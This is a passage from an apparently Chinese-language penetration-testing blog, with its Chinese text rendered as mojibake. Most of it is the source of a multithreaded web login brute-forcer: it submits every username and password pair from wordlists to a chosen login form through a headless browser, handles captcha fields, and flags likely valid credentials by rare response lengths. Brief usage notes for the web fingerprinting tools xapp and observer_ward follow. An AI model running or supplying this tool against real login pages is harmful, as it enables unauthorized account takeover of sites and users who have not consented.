class="comment"># æ³¨æ„ï¼šè¿™é‡Œä¸ç›´æ¥åˆ¤æ–­æˆåŠŸ/å¤±è´¥ï¼Œè€Œæ˜¯è®°å½•å“åº”é•¿åº¦</span></span><br><span class="line">                <span class="comment"># çœŸæ­£çš„æˆåŠŸåˆ¤æ–­å°†åœ¨æ‰€æœ‰å°è¯•å®Œæˆåé€šè¿‡åˆ†æå“åº”é•¿åº¦é‡å¤ç‡æ¥ç¡®å®š</span></span><br><span class="line">                result[<span class="string">&#x27;success&#x27;</span>] = <span class="literal">None</span>  <span class="comment"># æš‚æ—¶ä¸åˆ¤æ–­ï¼Œç­‰å¾…åç»­åˆ†æ</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">await</span> browser.close()</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            result[<span class="string">&#x27;error&#x27;</span>] = <span class="built_in">str</span>(e)</span><br><span class="line">            result[<span class="string">&#x27;success&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_result</span>(<span class="params">self, result: <span class="built_in">dict</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;å¤„ç†å•ä¸ªç»“æœ&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="variable language_">self</span>.lock:</span><br><span class="line">            <span class="variable language_">self</span>.results.append(result)</span><br><span class="line">            <span class="comment"># è¾“å‡ºæ ¼å¼ï¼šç”¨æˆ·å | å¯†ç  | å“åº”é•¿åº¦</span></span><br><span class="line">            response_length = result.get(<span class="string">&#x27;response_length&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;result[<span class="string">&#x27;username&#x27;</span>]&#125;</span> | <span class="subst">&#123;result[<span class="string">&#x27;password&#x27;</span>]&#125;</span> | <span class="subst">&#123;response_length&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æš‚æ—¶ä¸åˆ¤æ–­æˆåŠŸ/å¤±è´¥ï¼Œç­‰å¾…æ‰€æœ‰ç»“æœæ”¶é›†å®Œæˆåç»Ÿä¸€åˆ†æ</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">analyze_response_lengths</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;åˆ†æå“åº”é•¿åº¦é‡å¤ç‡æ¥åˆ¤æ–­ç™»å½•æˆåŠŸ&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.results:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ç»Ÿè®¡å“åº”é•¿åº¦å‡ºç°æ¬¡æ•°</span></span><br><span class="line">        length_counts = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> <span class="variable language_">self</span>.results:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;response_length&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">                length = result[<span class="string">&#x27;response_length&#x27;</span>]</span><br><span class="line">                <span class="keyword">if</span> length <span class="keyword">not</span> <span class="keyword">in</span> length_counts:</span><br><span class="line">                    length_counts[length] = []</span><br><span class="line">                length_counts[length].append(result)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æŒ‰å‡ºç°æ¬¡æ•°æ’åºï¼ˆé‡å¤ç‡ä»é«˜åˆ°ä½ï¼‰</span></span><br><span class="line">        sorted_lengths = <span class="built_in">sorted</span>(length_counts.items(), key=<span class="keyword">lambda</span> x: <span class="built_in">len</span>(x[<span class="number">1</span>]), reverse=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nå“åº”é•¿åº¦åˆ†æ:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å‘ç° <span class="subst">&#123;<span class="built_in">len</span>(length_counts)&#125;</span> ç§ä¸åŒçš„å“åº”é•¿åº¦&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># åˆ†æç»“æœ</span></span><br><span class="line">        <span class="keyword">for</span> i, (length, results) <span class="keyword">in</span> <span class="built_in">enumerate</span>(sorted_lengths):</span><br><span class="line">            count = <span class="built_in">len</span>(results)</span><br><span class="line">            percentage = (count / <span class="built_in">len</span>(<span class="variable language_">self</span>.results)) * <span class="number">100</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  é•¿åº¦ <span class="subst">&#123;length&#125;</span>: å‡ºç° <span class="subst">&#123;count&#125;</span> æ¬¡ (<span class="subst">&#123;percentage:<span class="number">.1</span>f&#125;</span>%)&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># å¦‚æœè¿™ä¸ªé•¿åº¦åªå‡ºç°ä¸€æ¬¡ï¼Œå¯èƒ½æ˜¯ç™»å½•æˆåŠŸ</span></span><br><span class="line">            <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">                result = results[<span class="number">0</span>]</span><br><span class="line">                result[<span class="string">&#x27;success&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">                result[<span class="string">&#x27;analysis_reason&#x27;</span>] = <span class="string">f&#x27;å”¯ä¸€å“åº”é•¿åº¦ <span class="subst">&#123;length&#125;</span>&#x27;</span></span><br><span class="line">                <span class="variable language_">self</span>.success_count += <span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    â†’ æ ‡è®°ä¸ºå¯èƒ½æˆåŠŸ: <span class="subst">&#123;result[<span class="string">&#x27;username&#x27;</span>]&#125;</span>:<span class="subst">&#123;result[<span class="string">&#x27;password&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># æ ‡è®°ä¸ºå¤±è´¥ï¼ˆé‡å¤ç‡é«˜ï¼‰</span></span><br><span class="line">                <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">                    result[<span class="string">&#x27;success&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">                    result[<span class="string">&#x27;analysis_reason&#x27;</span>] = <span class="string">f&#x27;å“åº”é•¿åº¦é‡å¤ <span class="subst">&#123;count&#125;</span> æ¬¡&#x27;</span></span><br><span class="line">                    <span class="variable language_">self</span>.failed_count += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># å¦‚æœæ²¡æœ‰å”¯ä¸€é•¿åº¦ï¼Œé€‰æ‹©é‡å¤ç‡æœ€ä½çš„ä½œä¸ºå¯èƒ½çš„æˆåŠŸ</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.success_count == <span class="number">0</span> <span class="keyword">and</span> sorted_lengths:</span><br><span class="line">            <span class="comment"># æ‰¾åˆ°é‡å¤ç‡æœ€ä½çš„é•¿åº¦</span></span><br><span class="line">            min_count = <span class="built_in">min</span>(<span class="built_in">len</span>(results) <span class="keyword">for</span> _, results <span class="keyword">in</span> sorted_lengths)</span><br><span class="line">            <span class="keyword">for</span> length, results <span class="keyword">in</span> sorted_lengths:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(results) == min_count:</span><br><span class="line">                    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">                        result[<span class="string">&#x27;success&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">                        result[<span class="string">&#x27;analysis_reason&#x27;</span>] = <span class="string">f&#x27;é‡å¤ç‡æœ€ä½çš„å“åº”é•¿åº¦ <span class="subst">&#123;length&#125;</span> (é‡å¤ <span class="subst">&#123;min_count&#125;</span> æ¬¡)&#x27;</span></span><br><span class="line">                        <span class="variable language_">self</span>.success_count += <span class="number">1</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  é€‰æ‹©é‡å¤ç‡æœ€ä½çš„é•¿åº¦ <span class="subst">&#123;length&#125;</span> ä½œä¸ºå¯èƒ½çš„æˆåŠŸ&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">run_bruteforce</span>(<span class="params">self, usernames: <span class="type">List</span>[<span class="built_in">str</span>], passwords: <span class="type">List</span>[<span class="built_in">str</span>]</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        è¿è¡Œçˆ†ç ´æ”»å‡»</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            usernames: ç”¨æˆ·ååˆ—è¡¨</span></span><br><span class="line"><span class="string">            passwords: å¯†ç åˆ—è¡¨</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nç›®æ ‡URL: <span class="subst">&#123;self.target_url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ç”¨æˆ·åæ•°é‡: <span class="subst">&#123;<span class="built_in">len</span>(usernames)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å¯†ç æ•°é‡: <span class="subst">&#123;<span class="built_in">len</span>(passwords)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æ€»å°è¯•æ¬¡æ•°: <span class="subst">&#123;<span class="built_in">len</span>(usernames) * <span class="built_in">len</span>(passwords)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;çº¿ç¨‹æ•°: <span class="subst">&#123;self.max_threads&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line">        </span><br><span class="line">        start_time = time.time()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># åˆ›å»ºæ‰€æœ‰å¯èƒ½çš„ç”¨æˆ·åå¯†ç ç»„åˆ</span></span><br><span class="line">        combinations = []</span><br><span class="line">        <span class="keyword">for</span> username <span class="keyword">in</span> usernames:</span><br><span class="line">            <span class="keyword">for</span> password <span class="keyword">in</span> passwords:</span><br><span class="line">                combinations.append((username, password))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ä½¿ç”¨çº¿ç¨‹æ± æ‰§è¡Œ</span></span><br><span class="line">        <span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="variable language_">self</span>.max_threads) <span class="keyword">as</span> executor:</span><br><span class="line">            <span class="comment"># æäº¤æ‰€æœ‰ä»»åŠ¡</span></span><br><span class="line">            future_to_combo = &#123;&#125;</span><br><span class="line">            <span class="keyword">for</span> i, (username, password) <span class="keyword">in</span> <span class="built_in">enumerate</span>(combinations):</span><br><span class="line">                future = executor.submit(</span><br><span class="line">                    asyncio.run, </span><br><span class="line">                    <span class="variable language_">self</span>.attempt_login(username, password, i % <span class="variable language_">self</span>.max_threads)</span><br><span class="line">                )</span><br><span class="line">                future_to_combo[future] = (username, password)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># å¤„ç†å®Œæˆçš„ä»»åŠ¡</span></span><br><span class="line">            <span class="keyword">for</span> future <span class="keyword">in</span> as_completed(future_to_combo):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    result = future.result()</span><br><span class="line">                    <span class="variable language_">self</span>.process_result(result)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    username, password = future_to_combo[future]</span><br><span class="line">                    error_result = &#123;</span><br><span class="line">                        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">                        <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">                        <span class="string">&#x27;username_length&#x27;</span>: <span class="built_in">len</span>(username),</span><br><span class="line">                        <span class="string">&#x27;password_length&#x27;</span>: <span class="built_in">len</span>(password),</span><br><span class="line">                        <span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">                        <span class="string">&#x27;error&#x27;</span>: <span class="built_in">str</span>(e),</span><br><span class="line">                        <span class="string">&#x27;thread_id&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="string">&#x27;timestamp&#x27;</span>: time.time()</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable language_">self</span>.process_result(error_result)</span><br><span class="line">        </span><br><span class="line">        end_time = time.time()</span><br><span class="line">        duration = end_time - start_time</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># åˆ†æå“åº”é•¿åº¦é‡å¤ç‡</span></span><br><span class="line">        <span class="variable language_">self</span>.analyze_response_lengths()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è¾“å‡ºç»Ÿè®¡ä¿¡æ¯</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æ€»è€—æ—¶: <span class="subst">&#123;duration:<span class="number">.2</span>f&#125;</span>ç§’&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æˆåŠŸ: <span class="subst">&#123;self.success_count&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å¤±è´¥: <span class="subst">&#123;self.failed_count&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æˆåŠŸç‡: <span class="subst">&#123;(self.success_count / <span class="built_in">len</span>(combinations) * <span class="number">100</span>):<span class="number">.2</span>f&#125;</span>%&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è¾“å‡ºæˆåŠŸçš„ç»“æœ</span></span><br><span class="line">        successful_results = [r <span class="keyword">for</span> r <span class="keyword">in</span> <span class="variable language_">self</span>.results <span class="keyword">if</span> r.get(<span class="string">&#x27;success&#x27;</span>) == <span class="literal">True</span>]</span><br><span class="line">        <span class="keyword">if</span> successful_results:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\nå¯èƒ½çš„å‡­æ®:&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> result <span class="keyword">in</span> successful_results:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  ç”¨æˆ·å: <span class="subst">&#123;result[<span class="string">&#x27;username&#x27;</span>]&#125;</span> (é•¿åº¦: <span class="subst">&#123;result[<span class="string">&#x27;username_length&#x27;</span>]&#125;</span>)&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  å¯†ç : <span class="subst">&#123;result[<span class="string">&#x27;password&#x27;</span>]&#125;</span> (é•¿åº¦: <span class="subst">&#123;result[<span class="string">&#x27;password_length&#x27;</span>]&#125;</span>)&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  å“åº”é•¿åº¦: <span class="subst">&#123;result.get(<span class="string">&#x27;response_length&#x27;</span>, <span class="number">0</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  åˆ†æåŸå› : <span class="subst">&#123;result.get(<span class="string">&#x27;analysis_reason&#x27;</span>, <span class="string">&#x27;æœªçŸ¥&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;final_url&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  æœ€ç»ˆURL: <span class="subst">&#123;result[<span class="string">&#x27;final_url&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">30</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.results</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ä¸»å‡½æ•°&quot;&quot;&quot;</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Webç™»å½•çˆ†ç ´å·¥å…·&#x27;</span>, formatter_class=CustomHelpFormatter)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--url&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;ç›®æ ‡URL&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--username-xpath&#x27;</span>, <span class="string">&#x27;-ux&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;ç”¨æˆ·åè¾“å…¥æ¡†XPath&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--password-xpath&#x27;</span>, <span class="string">&#x27;-px&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;å¯†ç è¾“å…¥æ¡†XPath&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--captcha-img-xpath&#x27;</span>, <span class="string">&#x27;-cx&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;éªŒè¯ç å›¾ç‰‡XPath&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--captcha-input-xpath&#x27;</span>, <span class="string">&#x27;-cix&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;éªŒè¯ç è¾“å…¥æ¡†XPath&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--login-button-xpath&#x27;</span>, <span class="string">&#x27;-lx&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;ç™»å½•æŒ‰é’®XPath&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--threads&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">5</span>, <span class="built_in">help</span>=<span class="string">&#x27;çº¿ç¨‹æ•°é‡ (é»˜è®¤: 5)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--usernames&#x27;</span>, <span class="string">&#x27;-uf&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;ç”¨æˆ·åæ–‡ä»¶è·¯å¾„&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--passwords&#x27;</span>, <span class="string">&#x27;-pf&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;å¯†ç æ–‡ä»¶è·¯å¾„&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--output&#x27;</span>, <span class="string">&#x27;-o&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;è¾“å‡ºç»“æœåˆ°æ–‡ä»¶ (æ”¯æŒ .xlsx, .csv, .json æ ¼å¼)&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># åˆ›å»ºçˆ†ç ´å™¨å®ä¾‹</span></span><br><span class="line">    bruster = LoginBruster(</span><br><span class="line">        target_url=args.url,</span><br><span class="line">        username_xpath=args.username_xpath,</span><br><span class="line">        password_xpath=args.password_xpath,</span><br><span class="line">        captcha_img_xpath=args.captcha_img_xpath,</span><br><span class="line">        captcha_input_xpath=args.captcha_input_xpath,</span><br><span class="line">        login_button_xpath=args.login_button_xpath,</span><br><span class="line">        max_threads=args.threads</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># åŠ è½½ç”¨æˆ·åå’Œå¯†ç æ–‡ä»¶</span></span><br><span class="line">    usernames = bruster.load_wordlist(args.usernames)</span><br><span class="line">    passwords = bruster.load_wordlist(args.passwords)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> usernames:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;é”™è¯¯ï¼šæ— æ³•åŠ è½½ç”¨æˆ·åæ–‡ä»¶æˆ–æ–‡ä»¶ä¸ºç©º&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> passwords:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;é”™è¯¯ï¼šæ— æ³•åŠ è½½å¯†ç æ–‡ä»¶æˆ–æ–‡ä»¶ä¸ºç©º&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è¿è¡Œçˆ†ç ´</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        results = asyncio.run(bruster.run_bruteforce(usernames, passwords))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ä¿å­˜ç»“æœåˆ°æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span> args.output:</span><br><span class="line">            <span class="comment"># åˆ›å»ºDataFrame</span></span><br><span class="line">            df_data = []</span><br><span class="line">            <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">                df_data.append(&#123;</span><br><span class="line">                    <span class="string">&#x27;ç”¨æˆ·å&#x27;</span>: result[<span class="string">&#x27;username&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;å¯†ç &#x27;</span>: result[<span class="string">&#x27;password&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;å“åº”é•¿åº¦&#x27;</span>: <span class="built_in">len</span>(result.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) <span class="keyword">if</span> result.get(<span class="string">&#x27;error&#x27;</span>) <span class="keyword">else</span> <span class="number">0</span>,</span><br><span class="line">                    <span class="string">&#x27;ç™»å½•æˆåŠŸ&#x27;</span>: result[<span class="string">&#x27;success&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;é”™è¯¯ä¿¡æ¯&#x27;</span>: result.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">                    <span class="string">&#x27;çº¿ç¨‹ID&#x27;</span>: result[<span class="string">&#x27;thread_id&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;æ—¶é—´æˆ³&#x27;</span>: result[<span class="string">&#x27;timestamp&#x27;</span>]</span><br><span class="line">                &#125;)</span><br><span class="line">            </span><br><span class="line">            df = pd.DataFrame(df_data)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æ ¹æ®æ–‡ä»¶æ‰©å±•åé€‰æ‹©ä¿å­˜æ ¼å¼</span></span><br><span class="line">            <span class="keyword">if</span> args.output.endswith(<span class="string">&#x27;.xlsx&#x27;</span>):</span><br><span class="line">                df.to_excel(args.output, index=<span class="literal">False</span>, engine=<span class="string">&#x27;openpyxl&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\nç»“æœå·²ä¿å­˜åˆ°Excelæ–‡ä»¶: <span class="subst">&#123;args.output&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> args.output.endswith(<span class="string">&#x27;.csv&#x27;</span>):</span><br><span class="line">                df.to_csv(args.output, index=<span class="literal">False</span>, encoding=<span class="string">&#x27;utf-8-sig&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\nç»“æœå·²ä¿å­˜åˆ°CSVæ–‡ä»¶: <span class="subst">&#123;args.output&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># é»˜è®¤ä¿å­˜ä¸ºJSON</span></span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(args.output, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    json.dump(results, f, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">2</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\nç»“æœå·²ä¿å­˜åˆ°JSONæ–‡ä»¶: <span class="subst">&#123;args.output&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nExit!&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;è¿è¡Œå‡ºé”™: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">       _                              _           __     __     ___ </span></span><br><span class="line"><span class="string"> ___  | |__     __ _    ___   __  __ (_)  _ __   / _\\   /__\\   / __\\</span></span><br><span class="line"><span class="string">/ __| | &#x27;_ \\   / _` |  / _ \\  \\ \\/ / | | | &#x27;_ \\  \\ \\   /_\\    / /   </span></span><br><span class="line"><span class="string">\\__ \\ | | | | | (_| | | (_) |  &gt;  &lt;  | | | | | | _\\ \\ //__   / /___ </span></span><br><span class="line"><span class="string">|___/ |_| |_|  \\__,_|  \\___/  /_/\\_\\ |_| |_| |_| \\__/ \\__/   \\____/ </span></span><br><span class="line"><span class="string">                                                            v1.0                                        </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">----------------------------------------- requirements -----------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">playwright</span><br><span class="line">Pillow</span><br><span class="line">pytesseract</span><br><span class="line">opencv-python</span><br><span class="line">pandas</span><br><span class="line">openpyxl</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="æŒ‡çº¹è¯†åˆ«"><a href="#æŒ‡çº¹è¯†åˆ«" class="headerlink" title="æŒ‡çº¹è¯†åˆ«"></a>æŒ‡çº¹è¯†åˆ«</h2><h3 id="xapp"><a href="#xapp" class="headerlink" title="xapp"></a>xapp</h3><ol>
<li><p>é¡¹ç›®åœ°å€</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">äºŒè¿›åˆ¶æ–‡ä»¶ï¼šhttps://github.com/chaitin/xapp</span><br><span class="line">æŒ‡çº¹å­—å…¸ï¼ˆ.ymlï¼‰ï¼šhttps://github.com/chaitin/xray-plugins</span><br></pre></td></tr></table></figure>
</li>
<li><p>é…ç½®</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. è¿è¡Œä¸€æ¬¡xapp -hï¼Œåœ¨å®¶ç›®å½•é‡Œé¢è‡ªåŠ¨ç”Ÿæˆ.xray/xappç›®å½•</span><br><span class="line">2. å°†æ‰€æœ‰çš„æŒ‡çº¹æ–‡ä»¶ï¼ˆ.ymlï¼‰æ”¾åˆ°~/.xray/app/plugin/ç›®å½•ä¸‹</span><br><span class="line">3. å°†~/.xray/xapp/xapp-config-example.yamlæ›´åä¸ºxapp-config.yamlï¼Œå¯ä»¥ä¿®æ”¹å…¨å±€User-Agentå’Œproxyå­—æ®µ</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä½¿ç”¨</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨å®¶ç›®å½•ä¸­çš„æ‰€æœ‰æŒ‡çº¹ï¼šxapp -t http://www.example.com</span><br><span class="line">ä½¿ç”¨æŒ‡å®šçš„æŒ‡çº¹ï¼ˆæ”¯æŒé€šé…ç¬¦ï¼‰ï¼šxapp -t http://www.example.com -r ./finger/xxx/apache.yml</span><br><span class="line">æŒ‡å®šç›®æ ‡æ–‡ä»¶ï¼šxapp -i targets.txt</span><br><span class="line">æŒ‡å®šè¾“å‡ºï¼šxapp -t http://www.example.com -o res.xlsx</span><br><span class="line">ç»¼åˆï¼šxapp -o res.xlsx -t http://www.example.com</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="observer-ward"><a href="#observer-ward" class="headerlink" title="observer_ward"></a>observer_ward</h3><ol>
<li><p>é¡¹ç›®åœ°å€</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">äºŒè¿›åˆ¶æ–‡ä»¶ï¼šhttps://github.com/emo-crab/observer_ward</span><br><span class="line">æŒ‡çº¹å­—å…¸ï¼ˆ.yamlï¼‰ï¼šhttps://github.com/0x727/FingerprintHub</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä½¿ç”¨</p>
